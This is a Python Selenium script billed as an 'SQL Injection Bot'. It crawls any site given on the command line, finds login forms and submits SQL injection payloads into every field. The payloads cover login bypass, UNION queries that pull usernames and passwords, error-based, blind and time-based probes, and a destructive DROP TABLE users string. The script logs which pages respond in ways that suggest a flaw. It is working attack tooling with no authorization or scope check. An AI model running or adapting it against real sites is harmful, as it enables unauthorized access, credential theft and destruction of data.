import argparse
import logging
import re
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from urllib.parse import urljoin, urlparse

# Configure logging to save results to a file
logging.basicConfig(filename='sql_injection.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Comprehensive list of SQL injection payloads categorized by type
payloads = {
    'basic': [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin' --",
        "' OR ''='"
    ],
    'union': [
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION ALL SELECT NULL, NULL, version() --",
        "' UNION SELECT 1, user(), database() --"
    ],
    'error': [
        "' AND 1=CONVERT(int, (SELECT @@version)) --",  # MSSQL
        "' OR 1=CAST((SELECT version()) AS int) --",     # PostgreSQL
        "'; DROP TABLE users --"                         # Generic
    ],
    'blind': [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND SUBSTRING((SELECT version()), 1, 1) = '5' --"
    ],
    'time': [
        "' OR SLEEP(5) --",                  # MySQL
        "' WAITFOR DELAY '0:0:5' --",        # MSSQL
        "' OR pg_sleep(5) --"                # PostgreSQL
    ]
}

# Common database error patterns for detection
error_patterns = [
    r"You have an error in your SQL syntax",              # MySQL
    r"unclosed quotation mark after the character string",# MSSQL
    r"PG::SyntaxError",                                   # PostgreSQL
    r"sqlite3.OperationalError"                           # SQLite
]

def find_login_forms(driver, url):
    """Locate forms on a page that likely represent login forms."""
    try:
        driver.get(url)
        forms = driver.find_elements(By.TAG_NAME, 'form')
        login_forms = []
        for form in forms:
            inputs = form.find_elements(By.TAG_NAME, 'input')
            input_types = [input.get_attribute('type') for input in inputs if input.get_attribute('type')]
            if 'password' in input_types:
                login_forms.append(form)
        return login_forms
    except Exception as e:
        logging.error(f"Error finding forms on {url}: {e}")
        return []

def get_baseline_response(driver, form):
    """Submit a form with invalid credentials to establish a baseline response."""
    try:
        inputs = form.find_elements(By.TAG_NAME, 'input')
        for input in inputs:
            if input.get_attribute('type') != 'submit':
                input.clear()
                input.send_keys('invalid')
        submit_button = form.find_element(By.XPATH, ".//input[@type='submit']")
        submit_button.click()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
        baseline_source = driver.page_source
        driver.back()
        return baseline_source
    except Exception as e:
        logging.error(f"Error getting baseline response: {e}")
        return ""

def inject_payload(driver, form, payload, field_name=None):
    """Inject a payload into specified or all input fields and submit the form."""
    try:
        inputs = form.find_elements(By.TAG_NAME, 'input')
        for input in inputs:
            if field_name and input.get_attribute('name') != field_name:
                continue
            if input.get_attribute('type') != 'submit':
                input.clear()
                input.send_keys(payload)
        submit_button = form.find_element(By.XPATH, ".//input[@type='submit']")
        submit_button.click()
    except Exception as e:
        logging.error(f"Error injecting payload '{payload}': {e}")

def analyze_response(driver, baseline_source, payload_type, response_time):
    """Analyze the response to detect potential SQL injection vulnerabilities."""
    try:
        current_source = driver.page_source
        if payload_type == 'time' and response_time > 5:
            return "Possible time-based SQL injection"
        elif any(re.search(pattern, current_source, re.IGNORECASE) for pattern in error_patterns):
            return "Possible SQL error"
        elif current_source != baseline_source:
            return "Response changed - possible vulnerability"
        return "No change"
    except Exception as e:
        logging.error(f"Error analyzing response: {e}")
        return "Analysis failed"

def test_form(driver, form, url):
    """Test a single form with all payloads."""
    logging.info(f"Testing form on {url}")
    baseline_source = get_baseline_response(driver, form)
    if not baseline_source:
        return
    input_names = [input.get_attribute('name') for input in form.find_elements(By.TAG_NAME, 'input') 
                   if input.get_attribute('type') != 'submit' and input.get_attribute('name')]
    for field in input_names:
        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                start_time = time.time()
                inject_payload(driver, form, payload, field)
                try:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
                except:
                    logging.warning(f"Timeout with payload: {payload} on field: {field}")
                    driver.back()
                    continue
                end_time = time.time()
                response_time = end_time - start_time
                result = analyze_response(driver, baseline_source, payload_type, response_time)
                if result != "No change":
                    logging.info(f"Field: {field}, Payload: {payload}, Result: {result}")
                driver.back()
                time.sleep(1)  # Avoid overwhelming the server

def crawl_and_test(driver, start_url):
    """Crawl the website and test all discovered login forms."""
    visited = set()
    to_visit = [start_url]
    while to_visit:
        url = to_visit.pop(0)
        if url in visited or not urlparse(url).netloc == urlparse(start_url).netloc:
            continue
        visited.add(url)
        logging.info(f"Visiting: {url}")
        forms = find_login_forms(driver, url)
        for form in forms:
            test_form(driver, form, url)
        try:
            driver.get(url)
            links = driver.find_elements(By.TAG_NAME, 'a')
            for link in links:
                href = link.get_attribute('href')
                if href and urlparse(href).netloc == urlparse(start_url).netloc:
                    absolute_url = urljoin(url, href)
                    if absolute_url not in visited:
                        to_visit.append(absolute_url)
        except Exception as e:
            logging.error(f"Error crawling {url}: {e}")

def main():
    """Main function to initialize the bot and start testing with command-line URL."""
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="SQL Injection Bot for testing login pages.")
    parser.add_argument('-u', '--url', required=True, help="Target URL (e.g., www.example.com)")
    args = parser.parse_args()

    # Ensure the URL has a scheme (http:// or https://)
    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url  # Default to http if no scheme provided

    # Set up Firefox options
    firefox_options = Options()
    firefox_options.binary_location = "/usr/bin/firefox"  # Path to Firefox binary in Ubuntu
    firefox_options.add_argument("--headless")  # Run in headless mode (no GUI in Termux)
    firefox_options.add_argument("--no-sandbox")  # Avoid sandbox issues

    # Set up Geckodriver service
    service = Service(executable_path="/usr/local/bin/geckodriver")  # Path to geckodriver

    # Initialize Firefox WebDriver
    driver = webdriver.Firefox(service=service, options=firefox_options)

    try:
        logging.info(f"Starting SQL injection test on {target_url}")
        crawl_and_test(driver, target_url)
    except Exception as e:
        logging.error(f"Main execution error: {e}")
    finally:
        driver.quit()
        logging.info("Testing completed.")

if __name__ == "__main__":
    main()
